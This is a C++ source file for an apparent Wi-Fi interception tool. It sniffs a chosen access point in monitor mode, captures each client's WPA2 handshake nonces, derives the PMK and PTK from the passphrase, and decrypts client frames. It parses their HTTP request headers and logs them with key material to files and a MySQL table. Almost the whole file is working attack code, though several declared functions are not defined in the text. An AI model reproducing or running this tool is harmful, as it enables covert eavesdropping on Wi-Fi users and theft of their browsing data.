/*
	project test code
*/
#include <iostream>
#include <vector>
#include <memory>
#include <thread>
#include <future>
#include <atomic>
#include <mutex>
#include <string>
#include <condition_variable>
#include <tins/tins.h>
#include <sstream>
#include <exception>
#include <queue>
#include <memory>
#include <algorithm>
#include <fstream>
#include <iomanip>
#include <ctime>
// for decrypt ptk
#include <openssl/evp.h>
#include <openssl/hmac.h>
#include <openssl/aes.h>
// my code
#include "/home/kim/project_sniffing/real_code/code/apscanner.h"
#include "/home/kim/project_sniffing/real_code/code/interfaceC.h"
//
#include <boost/scoped_ptr.hpp>

#include "mysql_connection.h"
#include "mysql_driver.h"

#include <cppconn/driver.h>
#include <cppconn/exception.h>
#include <cppconn/resultset.h>
#include <cppconn/prepared_statement.h>

using namespace std;

namespace project {
	class DB_connection {
		private :
		sql::Driver *driver;
		boost::scoped_ptr< sql::Connection > con;
		boost::scoped_ptr< sql::PreparedStatement > prep_stmt;
		//
		std::string url;
		std::string user;
		std::string password;
		std::string database;
		std::string table;
		//
		public :
		//
		DB_connection(std::string& url_,
						std::string& user_,
						std::string& password_,
						std::string& database_,
						std::string& table_);
		//
		bool get_driver_instance();
		//
		bool setConnection(std::string& url_, std::string& user_, std::string& pw, std::string& table_);
		bool setConnection();
		//
		bool executeQuery(std::string& ApMac,
			 			std::string& ApSsid,
						std::string& StaMac,
						std::shared_ptr< std::string > HttpRequestHeader,
						std::string& NetIp,
						std::string& NetPort);
		// setter and getter
		bool setUrl(std::string& url_);
		std::string setUrl();
		bool setUser(std::string& user_);
		std::string setUser();
		bool setPassWord(std::string& pw);
		std::string setPassWord();
		bool setDB(std::string& database_);
		std::string setDB();
		bool setTable(std::string& table_);
		std::string setTable();

	};
	//
	class ToDB{
		public :
		std::string APmac;
		std::string APssid;
		std::string STAmac;
		std::shared_ptr<std::string> lpHttp_request_header;
		std::string NAT_ip;
		std::string NAT_port;
		//
		ToDB(project::ToDB&& rhs){
			this->APmac = rhs.APmac;
			this->APssid = rhs.APssid;
			this->STAmac = rhs.STAmac;
			this->lpHttp_request_header = rhs.lpHttp_request_header;
			this->NAT_ip = rhs.NAT_ip;
			this->NAT_port = rhs.NAT_port;
		}
		ToDB(project::ToDB& rhs){
			this->APmac = rhs.APmac;
			this->APssid = rhs.APssid;
			this->STAmac = rhs.STAmac;
			this->lpHttp_request_header = rhs.lpHttp_request_header;
			this->NAT_ip = rhs.NAT_ip;
			this->NAT_port = rhs.NAT_port;
		}
		ToDB(std::string& APmac_, std::string& APssid_, std::string& STAmac_, std::shared_ptr<std::string> lpHttp_request_header_, std::string&& NAT_ip_, uint16_t NAT_port_){
			this->APmac = APmac_;
			this->APssid = APssid_;
			this->STAmac = STAmac_;
			this->lpHttp_request_header = lpHttp_request_header_;
			this->NAT_ip = NAT_ip_;
			this->NAT_port = std::to_string(NAT_port_);
		}
	};
	//
	class Sta{

		public :
		// constructor
		Sta();
		Sta(std::string& psk_, std::string& ssid_);
		// destructor
		// getter or setter
		uint32_t getThreadId();
		uint8_t getThreadState();
		void setPsk(std::string& str_);
		void setMAC(Tins::Dot11::address_type& staMac_);
		void setSSID(std::string& str_);
		void setBSSID(Tins::Dot11::address_type& bssid_);
		std::string getMAC();
		std::string getPsk();
		// member function
		void settedThread();
		void startWorking();
		bool join();
		// work pool
		bool insertQueue(std::shared_ptr<Tins::RawPDU>& shared_ptr_);
		bool dequeQueue(std::shared_ptr<Tins::RawPDU>& shared_ptr_);
		// deauthentification packet handling !!
		bool handleDeauthPacket();
		// generate ptk
		void clearPTK();
		bool generatePmk();
		bool generatePTK();
		// decrypt !!
		bool decryptDATA(std::shared_ptr<Tins::RawPDU>& shared_ptr, Tins::RawPDU::payload_type& pload);
		template<typename InputIterator1, typename InputIterator2, typename OutputIterator>
		void xor_range(InputIterator1 src1, InputIterator2 src2, OutputIterator dst, size_t sz) {
		    for (size_t i = 0; i < sz; ++i) {
		        *dst++ = *src1++ ^ *src2++;
		    }
		}
		// HTTP
		bool HttpParsing(Tins::RawPDU::payload_type& dataPayload, Tins::IP *ip, Tins::TCP *tcp);

		private :
		uint32_t id;
		std::string staMac;
		Tins::Dot11::address_type staMacHW;
		std::string psk;
		std::string ssid;
		std::string bssid;
		Tins::Dot11::address_type bssidHW;
		// ptk
		bool checkPTK;
		bool aNonceChk;
		bool sNonceChk;
		uint8_t aNonce[32];
		uint8_t sNonce[32];
		uint8_t pmk[32];
		uint8_t kck[16];
		uint8_t kek[16];
		uint8_t tk[16];
		uint8_t txKey[8];
		uint8_t rxKey[8];
		//
		thread t;
		std::atomic<uint32_t> countSleep;
		std::atomic<uint8_t> threadState; // 0: init 1 : run 2: sleep return;
		// work pool
		std::mutex kEncryptedPacketQue;
		std::queue<std::shared_ptr<Tins::RawPDU>> encryptedPacketQue;
		// result packet
		std::queue<std::shared_ptr<project::ToDB>> decryptedPacketQue;
	};
	//
	class Radio_Sniffer{
		public :
		// contructor
		Radio_Sniffer();
		Radio_Sniffer(project::Interface& inte);
		Radio_Sniffer(project::Interface& inte, project::Ap& targetAp_);
		Radio_Sniffer(Radio_Sniffer& rhs) = delete;
		// destructor

		// member funtion
		Radio_Sniffer& operator=(Radio_Sniffer& rhs) = delete;
		void setTargetAp(project::Ap& targetAp_);
		void on();
		//
		void setSniffThread();
		bool mySniffingCallback(Tins::PDU& myPdu);
		//
		bool distribute_callback();
		//void outing_result();	//
		// PacketQue inset and deque
		bool packetQueDeque(std::shared_ptr<Tins::RawPDU>& lptmp);
		void packetQueInsert(std::vector<uint8_t>& vec);
		// setter and getter
		void set_NetworkInterface(project::Interface& inte);
		std::string get_deviceName();
		void setTargetMacAddress(std::string& str_);
		// O
		static int sgetNthreadID();
		// Exception
		static int plusExcptionNum();
		static void setException(std::exception& e, int id);
		static std::exception_ptr getException(int id);
		static int getExVecSize();
		// exception ; when : all thread throw exception input Exception to this Vector
		static std::mutex kExceptionVec;
		static std::vector<std::exception_ptr> exVec;
		//********************************************************
		private :
		// Interface Information and Sniffing Syntax
		std::string targetMacAddress;
		project::Interface mInterface;
		// seleted Ap info
		project::Ap targetAp;
		// Sta Vector ; when : distribute thread create Sta Intance input Intance to Vector
		std::vector<std::shared_ptr<project::Sta>> mStaVec;
		// Exit check	* run : false * end : true; init = false wheh thread starting
		std::vector<std::atomic<bool>> threadState;
		// packetQue; disttribute thread reading this Vector and create Sta and run Sta Thread
		std::queue<std::shared_ptr<Tins::RawPDU>> packetQue;
		std::mutex kPacketQue;
		// all thread number
		static std::atomic<int> nThread;
	};
	// debug mode
	bool printHttpRequestHeader = false;
	bool printFile = false;
	// O
	void sig_handler(int signo);
	void set_sig(bool a);
	bool get_sig();
	// init sharing signal variable ;
	// sniffing, distribute, outing thread check this signal
	std::atomic<bool> sigon(false);
	std::mutex ksig;
	// SendThread
	std::mutex kSendQueue;
	std::condition_variable sendCV;
	std::queue<std::shared_ptr<project::ToDB>> sendQueue;
	bool insertSendQueue(std::queue<std::shared_ptr<project::ToDB>>& decryptedQueue);
	bool sendThread();
}
// init All Thread Number;
std::atomic<int> project::Radio_Sniffer::nThread(0);
// exception ; when : all thread throw exception input Exception to this Vector
std::mutex project::Radio_Sniffer::kExceptionVec;
std::vector<std::exception_ptr> project::Radio_Sniffer::exVec;

int main(int argc, char **argv){
	// debuf mod
	if(argc == 2) {
		std::string arg(argv[1]);
		if(arg == "-printHttpPacket") {
			project::printHttpRequestHeader = true;
		}
		if(arg == "-h") {
			std::cout << "if you print Http Request Packet : ./program -printHttpPacket" << std::endl;
			return 0;
		}
		if(arg == "-printFile") {
			project::printFile = true;
		}
	}
	//
	project::Interface myInterface;
	project::Ap selectAp;
	{
		project::Apscanner myAp;
		myAp.on();
		selectAp = myAp.select_ap();
		myInterface = myAp.getInterface();
	}
	project::Radio_Sniffer mySniffer(myInterface, selectAp);
	//
	mySniffer.on();
	return 0;
}
//************************** Radio_Sniffer ***************************
// Exception
int project::Radio_Sniffer::plusExcptionNum(){
	std::unique_lock<std::mutex> loc(project::Radio_Sniffer::kExceptionVec);
	int size = project::Radio_Sniffer::exVec.size();
	size = size +1;
	project::Radio_Sniffer::exVec.resize(size);
	project::Radio_Sniffer::nThread++;
	return size;
}
void project::Radio_Sniffer::setException(std::exception& e, int id){
	std::exception_ptr lpE = std::make_exception_ptr(e);
	std::unique_lock<std::mutex> loc(project::Radio_Sniffer::kExceptionVec);
	project::Radio_Sniffer::exVec[id-1] = lpE;
}
std::exception_ptr project::Radio_Sniffer::getException(int id){
	std::unique_lock<std::mutex> loc(project::Radio_Sniffer::kExceptionVec);
	std::exception_ptr lpE = project::Radio_Sniffer::exVec[id-1];
	return lpE;
}
int project::Radio_Sniffer::getExVecSize(){
	std::unique_lock<std::mutex> loc(project::Radio_Sniffer::kExceptionVec);
	int size = project::Radio_Sniffer::exVec.size();
	return size;
}
// signal
void project::sig_handler(int signo){
	std::cout << "[project::sig_handler] : Terminate Work !" << std::endl;
	project::set_sig(true);
}
void project::set_sig(bool a){
	std::unique_lock<std::mutex> lck(project::ksig);
	if(a == true) project::sigon = true;
	else project::sigon = false;
}
bool project::get_sig(){
	std::unique_lock<std::mutex> lck(project::ksig);
	if(project::sigon == true) return true;
	else return false;
}
// PacketQue inset and deque
void project::Radio_Sniffer::packetQueInsert(std::vector<uint8_t>& vec){
	std::unique_lock<std::mutex> lck(this->kPacketQue);
	this->packetQue.push(std::shared_ptr<Tins::RawPDU>(new Tins::RawPDU(vec.cbegin(),vec.cend())));
//	std::cout << "[TEST] packet queue insert size : " << this->packetQue.size() << std::endl;
}
bool project::Radio_Sniffer::packetQueDeque(std::shared_ptr<Tins::RawPDU>& lptmp){
	std::unique_lock<std::mutex> lck(this->kPacketQue);
	if(this->packetQue.size() == 0) return false;
	lptmp = this->packetQue.front();
	this->packetQue.pop();
//	std::cout << "[TEST] packet queue dequeue size : " << this->packetQue.size() << std::endl;
	return true;
}
// contructor
project::Radio_Sniffer::Radio_Sniffer(){
	this->targetMacAddress = "";
}
project::Radio_Sniffer::Radio_Sniffer(project::Interface& inte){
	this->mInterface = inte;
	this->targetMacAddress = "";
}
project::Radio_Sniffer::Radio_Sniffer(project::Interface& inte, project::Ap& targetAp_){
	this->mInterface = inte;
	this->targetAp = targetAp_;
	this->targetMacAddress = "";
}
// destructor

// member funtion
void project::Radio_Sniffer::setTargetAp(project::Ap& targetAp_){
	this->targetAp = targetAp_;
}
//
void project::Radio_Sniffer::on(){
	// not yet setting networkInterface
	if(!this->mInterface.checkFlag()){
		std::cout << "[project::Radio_Sniffer::on]<> : Not yet setting NetworkInterface" << std::endl;
		return;
	}
	// set Signal !!
	signal(SIGINT, project::sig_handler);
	//
	std::thread t{&project::Radio_Sniffer::setSniffThread,this};
	std::thread t1{&project::Radio_Sniffer::distribute_callback, this};
	std::thread t2{&project::sendThread};
//	outing_result();
	// Exit Check acquired !!
	t.join();
	t1.join();
	t2.join();
// last
	std::cout << "[program] End" << std::endl;
	signal(SIGINT, SIG_DFL);
}
			/* Sniffing */
void project::Radio_Sniffer::setSniffThread(){
	// get thread's Id and thread's plus self Exception index !!
	int id = project::Radio_Sniffer::plusExcptionNum();
	std::cout << "[project::Radio_Sniffer::setSniffThread] id : " << id << std::endl;
	// Sniffing variable setting !!
	Tins::SnifferConfiguration config;
	// mode
	try{
		config.set_rfmon(true);
		config.set_promisc_mode(true);
		//
		std::string target = this->targetAp.getBssid().to_string();
		std::stringstream syntax;
		syntax << "((wlan addr1 " << this->targetAp.getBssid().to_string() <<
				" or wlan addr2 " << this->targetAp.getBssid().to_string() <<
				" or wlan addr3 " << this->targetAp.getBssid().to_string() <<
				" or wlan addr4 " << this->targetAp.getBssid().to_string() <<
				") and !(wlan addr1 ff:ff:ff:ff:ff:ff" <<
				" or wlan addr2 ff:ff:ff:ff:ff:ff" <<
				" or wlan addr3 ff:ff:ff:ff:ff:ff" <<
				" or wlan addr4 ff:ff:ff:ff:ff:ff))";
		if(this->targetMacAddress.length() != 0){
			syntax << " and (wlan addr1 " << this->targetMacAddress <<
			" or wlan addr2 " << this->targetMacAddress <<
			" or wlan addr3 " << this->targetMacAddress <<
			" or wlan addr4 " << this->targetMacAddress << ")";
		}
		config.set_filter(syntax.str());
		//
	}catch(std::exception& e){
		project::Radio_Sniffer::setException(e, id);
		std::cerr << "Sniffing Thread Throw Error !! " << std::endl;
	}
	// create Sniffer
	Tins::Sniffer radioSniffer(this->get_deviceName(),config);
	// st
	try{
		radioSniffer.set_extract_raw_pdus(true); // for copy
		radioSniffer.sniff_loop(Tins::make_sniffer_handler(this, &project::Radio_Sniffer::mySniffingCallback),0);
	}catch(std::exception& e){
		project::Radio_Sniffer::setException(e, id);
		std::cerr << "[project::Radio_Sniffer::setSniffThread]<Sniffing Try> : Sniffing Thread Throw Error !! " << std::endl;
	}
}
// lootins !!
bool project::Radio_Sniffer::mySniffingCallback(Tins::PDU& myPdu){
	// signal
	if(project::get_sig() == true) return false;
	// Create RadioTap
	Tins::RawPDU raw = myPdu.rfind_pdu<Tins::RawPDU>();
	// raw pdu for copy
	int packetSize = raw.size();
	std::vector<uint8_t>& tmpVec = raw.payload();
	packetQueInsert(tmpVec);
	return true;
}
		/* distribute work to sta thread */
bool project::Radio_Sniffer::distribute_callback(){
	// get thread's Id and thread's plus self Exception index !!
	uint32_t id = project::Radio_Sniffer::plusExcptionNum();
	std::cout << "[Radio_Sniffer::distribute_callback] : id : " << id << std::endl;
	//
	bool check = true;
	// wlan multicast mac
	std::string ipv4mcastStr1 = "01:00:5e:";
	std::string ipv4mcastStr2 = "33:33:";
	while(true){
		// signal
		if(project::get_sig() == true) break;;
		// get Packet RawPDU
		std::shared_ptr<Tins::RawPDU> tmpPtr;
		check = packetQueDeque(tmpPtr);
		if(check == false){
			std::cout << "[Radio_Sniffer::distribute_callback]<packet Dequeue> : Packet Queue is empty" <<std::endl;
			std::this_thread::sleep_for(std::chrono::milliseconds(5000));
			continue;
		}
		// get RawPDU PTR
		Tins::Dot11::address_type targetHw = this->targetAp.getBssid();
		std::string targetStr = targetHw.to_string();
		std::string staStr = "";
		Tins::Dot11::address_type staHw;
		std::shared_ptr<project::Sta> tmpSta;
		// get Sta Addr
		Tins::Dot11Data *lpDotData = 0;
		Tins::Dot11ManagementFrame *lpDotManage = 0;
		Tins::Dot11QoSData *lpDotQos = 0;
		Tins::Dot11Control *lpDotControl = 0;
		Tins::Dot11Authentication *lpDotAuthen = 0;
		try{
			lpDotAuthen = tmpPtr->to<Tins::RadioTap>().find_pdu<Tins::Dot11Authentication>();
			lpDotControl = tmpPtr->to<Tins::RadioTap>().find_pdu<Tins::Dot11Control>();
			lpDotData = tmpPtr->to<Tins::RadioTap>().find_pdu<Tins::Dot11Data>();
			lpDotManage = tmpPtr->to<Tins::RadioTap>().find_pdu<Tins::Dot11ManagementFrame>();
			lpDotQos = tmpPtr->to<Tins::RadioTap>().find_pdu<Tins::Dot11QoSData>();
		}catch(std::exception& e){
			std::cout << "[Radio_Sniffer::distribute_callback] : find_pdu<>() throw Exception !!" << std::endl;
			std::cout << e.what() << std::endl;
		}

		if(!(lpDotQos == 0)){
			// Qos Only create Sta
			// get Sta MAC
			Tins::Dot11::address_type add1 = lpDotData->dst_addr();
			Tins::Dot11::address_type add2 = lpDotData->src_addr();
			std::string add1str = add1.to_string();
			std::string add2str = add2.to_string();
			// ipv4 multicast mac handle
			if((add1str.substr(0, 9) == ipv4mcastStr1)
			 || (add1str.substr(0,6) == ipv4mcastStr2)) continue;
			//	str Mac Detect !!
			if(add1str == targetStr){
				staHw = add2;
				staStr = add2str;
			}
			else{
				staHw = add1;
				staStr = add1str;
			}
			//
			check = false;
			// existing STA finding
			for(uint32_t i=0;i<this->mStaVec.size();i++){
				if(this->mStaVec[i]->getMAC() == staStr){
					tmpSta = this->mStaVec[i];
					uint8_t threadState = tmpSta->getThreadState();
					if(threadState == 2){
						std::cout << "[Radio_Sniffer::distribute_callback]<Dot11 Qos> : sleep thread wake up !!" << std::endl;
						tmpSta->join();
						tmpSta->settedThread();
					}
					check = true;
					break;
				}
			}
			// STA Create !!
			if(check == false){
				std::string tmptmp = this->targetAp.getPsk();
				std::string ssid = this->targetAp.getSSid();
				this->mStaVec.push_back(std::shared_ptr<project::Sta>(new project::Sta(tmptmp,ssid)));
				tmpSta = this->mStaVec[this->mStaVec.size()-1];
				tmpSta->setMAC(staHw);
				tmpSta->setBSSID(targetHw);
				tmpSta->settedThread(); // Thread Start !!
			}
		}
		else if( lpDotAuthen != 0){
			// Authentification packet capture !!
			// get Sta MAC
			Tins::Dot11::address_type add1 = lpDotAuthen->addr1();
			Tins::Dot11::address_type add2 = lpDotAuthen->addr2();
			std::string add1str = add1.to_string();
			std::string add2str = add2.to_string();
			//	str Mac Detect !!
			if(add1str == targetStr){
				staStr = add2str;
				staHw = add2;
			}
			else{
				staStr = add1str;
				staHw = add1;
			}
			//
			check = false;
			// existing STA finding
			for(uint32_t i=0;i<this->mStaVec.size();i++){
				if(this->mStaVec[i]->getMAC() == staStr){
					tmpSta = this->mStaVec[i];
					uint8_t threadState = tmpSta->getThreadState();
					if(threadState == 2){
						std::cout << "[Radio_Sniffer::distribute_callback]<Dot11 Auth> : sleep thread wake up !!" << std::endl;
						tmpSta->join(); // waiting join...
						tmpSta->settedThread();
						std::this_thread::sleep_for(std::chrono::milliseconds(1000));
					}
					check = true;
					break;
				}
			}
			// STA Create !!
			if(check == false){
				std::string tmptmp = this->targetAp.getPsk();
				std::string ssid = this->targetAp.getSSid();
				this->mStaVec.push_back(std::shared_ptr<project::Sta>(new project::Sta(tmptmp,ssid)));
				tmpSta = this->mStaVec[this->mStaVec.size()-1];
				tmpSta->setMAC(staHw);
				tmpSta->setBSSID(targetHw);
				tmpSta->settedThread(); // Thread Start !!
			}
		}
		else if(!(lpDotManage == 0)){
			std::string add1str = lpDotManage->addr1().to_string();
			std::string add2str = lpDotManage->addr2().to_string();
			std::string add3str = lpDotManage->addr3().to_string();
			std::string add4str = lpDotManage->addr4().to_string();
			// STA Search !!
			// existing STA finding
			std::string tmpStr = "";
			for(uint32_t i=0;i<this->mStaVec.size();i++){
				tmpStr = mStaVec[i]->getMAC();
				//
				check = false;
				if(add1str == tmpStr) staStr = tmpStr;
				else if(add2str == tmpStr) staStr = tmpStr;
				else if(add3str == tmpStr) staStr = tmpStr;
				else if(add4str == tmpStr) staStr = tmpStr;
				//
				if(staStr != "") break;
			}
			//
			if(staStr == "") continue;
			//
			for(uint32_t i=0;i<this->mStaVec.size();i++){
				if(this->mStaVec[i]->getMAC() == staStr){
					tmpSta = this->mStaVec[i];
					uint8_t threadState = tmpSta->getThreadState();
					if(threadState == 2){
						continue;
					}
					check = true;
					break;
				}
			}
		}
		else if(!(lpDotData == 0)){
			continue;
		}
		else if(!(lpDotControl == 0)){
			continue;
		}
		else continue;
		// work copy
		tmpSta->insertQueue(tmpPtr);
	}
	// STA Thread Exit Waiting !!
	for(auto& t : this->mStaVec) t.get()->join();
}
// setter or getter
void project::Radio_Sniffer::set_NetworkInterface(project::Interface& inte){
	this->mInterface = inte;
}
std::string project::Radio_Sniffer::get_deviceName(){
	return this->mInterface.getInterfaceName();
}
void project::Radio_Sniffer::setTargetMacAddress(std::string& str_){
	this->targetMacAddress = str_;
}

//*********************************************************************/

//************************** Sta *************************************
// contructor
project::Sta::Sta(){
	this->countSleep = 0;
	this->threadState = 0;
	this->id = 0;
	this->checkPTK = false;
	this->sNonceChk = false;
	this->aNonceChk = false;
	//
	memset(this->aNonce,0,32);
	memset(this->sNonce,0,32);
	memset(this->pmk,0,32);
	memset(this->kck,0,16);
	memset(this->kek,0,16);
	memset(this->tk,0,16);
	memset(this->txKey,0,8);
	memset(this->rxKey,0,8);
	//
}
project::Sta::Sta(std::string& psk_, std::string& ssid_)
:ssid(ssid_),psk(psk_){
		this->countSleep = 0;
		this->threadState = 0;
		this->id = 0;
		this->checkPTK = false;
		this->sNonceChk = false;
		this->aNonceChk = false;
		//
		memset(this->aNonce,0,32);
		memset(this->sNonce,0,32);
		memset(this->pmk,0,32);
		memset(this->kck,0,16);
		memset(this->kek,0,16);
		memset(this->tk,0,16);
		memset(this->txKey,0,8);
		memset(this->rxKey,0,8);
		//
		this->generatePmk();
}
// setter or gettter
void project::Sta::setMAC(Tins::Dot11::address_type& staMac_){
	this->staMac = staMac_.to_string();
	this->staMacHW = staMac_;
}
void project::Sta::setPsk(std::string& str_){
	this->psk = str_;
}
std::string project::Sta::getMAC(){
	return this->staMac;
}
std::string project::Sta::getPsk(){
	return this->psk;
}
void project::Sta::setSSID(std::string& str_){
	this->ssid = str_;
}
void project::Sta::setBSSID(Tins::Dot11::address_type& bssid_){
	this->bssid = bssid_.to_string();
	this->bssidHW = bssid_;
}
uint8_t project::Sta::getThreadState(){
	return (uint8_t)this->threadState;
}
uint32_t project::Sta::getThreadId(){
	return this->id;
}
//
// work pool
bool project::Sta::insertQueue(std::shared_ptr<Tins::RawPDU>& shared_ptr_){
	std::unique_lock<std::mutex> lck(this->kEncryptedPacketQue);
	this->encryptedPacketQue.push(std::shared_ptr<Tins::RawPDU>(shared_ptr_));
	return true;
}
bool project::Sta::dequeQueue(std::shared_ptr<Tins::RawPDU>& shared_ptr_){
	std::unique_lock<std::mutex> lck(this->kEncryptedPacketQue);
	if(this->encryptedPacketQue.empty()){
		//std::cout << "queue size : " << this->encryptedPacketQue.size() << std::endl;
		return false;
	}
	shared_ptr_ = this->encryptedPacketQue.front();
	this->encryptedPacketQue.pop();
	return true;
}
// handle deauthentication packet !!
bool project::Sta::handleDeauthPacket(){
	// wait for Accept All deauth packet !!
	std::this_thread::sleep_for(std::chrono::milliseconds(1000));
	std::unique_lock<std::mutex> lck(this->kEncryptedPacketQue);
	uint32_t i=0, size = this->encryptedPacketQue.size();
	//
	try{
		for(i; i < size; i++) {
			std::shared_ptr<Tins::RawPDU> lpTmp = this->encryptedPacketQue.front();
			if(lpTmp->to<Tins::RadioTap>().find_pdu<Tins::Dot11Deauthentication>() == 0) break;
			this->encryptedPacketQue.pop();
		}
	}catch(std::exception& e){
		std::cout << "[project::Sta::handleDeauthPacket] : at check deauth packet !!" << std::endl;
	}
	return true;
}
// member function
void project::Sta::settedThread(){
	std::cout << "["<<this->staMac <<"] settedThread Start !! " << std::endl;
	this->t = std::thread(&project::Sta::startWorking,this);
}
bool project::Sta::join(){
	this->t.join();
	return true;
}
void project::Sta::startWorking(){
	// thread ID create
	this->threadState = 1; // thread is running
	this->countSleep = 0;	// sleep Count init
	uint32_t count = 0;
	// TEST
	std::cout << "-------------------------- 1 -----------------------" << std::endl;
	std::cout << "PSK : " << this->psk << std::endl;
	std::cout << "ssid : " << this->ssid << std::endl;
	std::cout << "bssid : " << this->bssid << std::endl;
	std::cout << "mac : " << this->staMac << std::endl;
	std::cout << "PMK : ";
	for(uint32_t i = 0; i< 32 ; i++) printf("%x",this->pmk[i]);
	std::cout << std::endl;
	std::cout << "-------------------------- 2 -----------------------" << std::endl;
	//
	if(this->id == 0) this->id = project::Radio_Sniffer::plusExcptionNum();
	std::cout << "[project::Sta::start Working]<" << this->staMac << "> : id : " << this->id << " psk : " << this->psk << std::endl;
	// Start Work !!
	while(true){
		// check signal !!
		if(project::get_sig() == true){
			std::cout << "[STA " << std::setw(2) << this->id << "]: " << this->staMac << " !!" << std::endl;
			break;
		}
		// Encrypted Data Get !!
		std::shared_ptr<Tins::RawPDU> tmpPtr;
		if(!this->dequeQueue(tmpPtr)){
			if(count <= 5){
				this->countSleep = this->countSleep + 1;
				if(this->countSleep >= 10){
					this->threadState = 2;	// thread state is sleep(deauthentication or away)
					this->clearPTK();
					return;
				}
			}
			count = 0;
	//		std::cout << "[" << this->staMac << ", id : " << setw(2) << this->id << "] Encrypted Data Queue is empty | sleep count : " << this->countSleep << std::endl;
			std::this_thread::sleep_for(std::chrono::milliseconds(8000));
			continue;
		}
		// deauthentification packet capture !!
		if(tmpPtr->to<Tins::RadioTap>().find_pdu<Tins::Dot11Deauthentication>() != 0){
			std::cout << "[" << this->staMac << ", id : " << setw(2) << this->id << "] STA Deauthentication"  << std::endl;
			this->handleDeauthPacket();
			this->threadState = 2;
			this->clearPTK();
			return;
		}
		// authentification packet ??
		if(tmpPtr->to<Tins::RadioTap>().find_pdu<Tins::Dot11Authentication>() != 0){
			this->clearPTK();
		}
		//
		this->countSleep = 0;
		count++;
		// Get Anonce & Snonce
		if((this->aNonceChk == false)||(this->sNonceChk == false)){
			Tins::RSNEAPOL *lpRsnEapol = 0;
			lpRsnEapol = tmpPtr->to<Tins::RadioTap>().find_pdu<Tins::RSNEAPOL>();
			if(lpRsnEapol == 0) continue;
			//
			Tins::Dot11Data *lpEapolData = tmpPtr->to<Tins::RadioTap>().find_pdu<Tins::Dot11Data>();
			std::string src = lpEapolData->src_addr().to_string();
			std::string dst = lpEapolData->dst_addr().to_string();
			uint32_t nonceSize = 0;
			if((src == this->bssid)&&(dst == this->staMac)){
				// anonce check !
				if(this->aNonceChk == true) continue;
				// anonce
				const uint8_t *tmpAnonce = lpRsnEapol->nonce();
				nonceSize = lpRsnEapol->nonce_size;
				// check !
				uint32_t sum = 0;
				for(uint32_t i=0;i<nonceSize;i++){
					sum += tmpAnonce[i];
				}
				if(sum == 0) continue;
				//
				std::cout << "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~" << std::endl;
				std::cout << "STA : " << this->staMac << std::endl;
				printf("Anonce is : ");
				for(uint8_t i=0;i<32;i++){
					printf("%x",tmpAnonce[i]);
				}
				std::cout << "\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~" << std::endl;
				//
				memcpy(this->aNonce, tmpAnonce, nonceSize);
				this->aNonceChk = true;
			}else if((src == this->staMac)&&(dst == this->bssid)){
				// snonce check !
				if(this->sNonceChk == true) continue;
				// snonce
				const uint8_t *tmpSnonce = lpRsnEapol->nonce();
				nonceSize = lpRsnEapol->nonce_size;
				// check !
				uint32_t sum = 0;
				for(uint32_t i=0;i<nonceSize;i++){
					sum += tmpSnonce[i];
				}
				if(sum == 0) continue;
				//
				std::cout << "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~" << std::endl;
				std::cout << "STA : " << this->staMac << std::endl;
				printf("Snonce is : ");
				for(uint8_t i=0;i<32;i++){
					printf("%x",tmpSnonce[i]);
				}
				std::cout << "\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~" << std::endl;
				//
				memcpy(this->sNonce, tmpSnonce, nonceSize);
				this->sNonceChk = true;
			}
			if((this->aNonceChk == false)||(this->sNonceChk == false)) continue;
		}
		// Create PTK Mode
		if(this->checkPTK == false){
			this->generatePTK();
			//
			std::cout << "[" << this->staMac << "'s TK] : ";
			for(uint32_t i=0;i<16;i++){
				printf("%x",this->tk[i]);
			}
			std::cout << std::endl;
			//
		}
		// Decrypt DATA !!
		Tins::RadioTap radioTmp;
		try{
			radioTmp =  tmpPtr->to<Tins::RadioTap>();
		}catch(...){
			continue;
		}
		Tins::Dot11QoSData *qos = 0;
		if((qos = radioTmp.find_pdu<Tins::Dot11QoSData>()) == 0){
			// another packet handling
		}
		// qos packet handling !!
		Tins::RawPDU::payload_type tmpVec;
		try{
			if(this->decryptDATA(tmpPtr, tmpVec) == false) continue;
		}catch(std::exception& e){
			continue;
		}
		// qos packet
		Tins::SNAP snap;
		Tins::IP *ip = 0;
		Tins::TCP *tcp = 0;
		Tins::RawPDU *data = 0;
		try{
			snap = Tins::SNAP(&tmpVec[0], tmpVec.size()-16);
		}catch(std::exception& e){
			std::cout << "[StartWoring]<Tins::SNAP()> Throw Exception : " << e.what() << std::endl;
			continue;
		}
		ip = snap.find_pdu<Tins::IP>();
		tcp = snap.find_pdu<Tins::TCP>();
		data = snap.find_pdu<Tins::RawPDU>();
		if((ip  == 0) || (tcp  == 0) || (data  == 0)){
			//std::cout << "Not Found IP or TCP or DATA !!" << std::endl;
			continue;
		}
		Tins::RawPDU::payload_type& dataPayload = data->payload();
		//
		if(this->HttpParsing(dataPayload, ip, tcp) == false) continue;
		// print File
		if(project::printFile == false) continue;
		try{
			std::ofstream ofs("./sta/" + this->staMac + ".txt",std::ofstream::app | std::ofstream::out);
			std::stringstream ss;
			ss << "================================== 1 ======================================\n";
			ss << "MAC : " << this->staMac << std::endl;
			ss << "PMK : ";
			for(uint32_t i=0;i<32;i++){
				ss << std::hex << this->pmk[i];
			}
			ss << std::endl;
			ss << "Snonce : ";
			for(uint32_t i=0;i<32;i++){
				ss << std::hex << this->sNonce[i];
			}
			ss << std::endl;
			ss << "Anonce : ";
			for(uint32_t i=0;i<32;i++){
				ss << std::hex << this->aNonce[i];
			}
			ss << std::endl;
			ss << "Src :" <<ip->src_addr().to_string() << " : " << tcp->sport()<<" / " <<"Dst :" << ip->dst_addr().to_string() << " : "<< tcp->dport() <<std::endl;
			ss << "------------------------------------------------------------------------\n";
			for(auto& t : dataPayload){
				ss << (char)t;
			}
			ss << "\n================================== 2 ======================================\n";
			ofs << ss.str();
			ofs.close();
			//
		}catch(std::exception& e){
			std::cout << "ofs Exception : " << e.what() << std::endl;
		}

	}
}

void project::Sta::clearPTK(){
	memset(this->aNonce,0,32);
	memset(this->sNonce,0,32);
	memset(this->kck,0,16);
	memset(this->kek,0,16);
	memset(this->tk,0,16);
	memset(this->txKey,0,8);
	memset(this->rxKey,0,8);
	this->checkPTK = false;
	this->sNonceChk = false;
	this->aNonceChk = false;
}
bool project::Sta::generatePmk(){
	uint8_t buf[32];
	PKCS5_PBKDF2_HMAC_SHA1(this->psk.c_str(), this->psk.size(), (uint8_t *)this->ssid.c_str(), this->ssid.size(), 4096, 32, buf);
    memcpy(this->pmk, buf, 32);
}
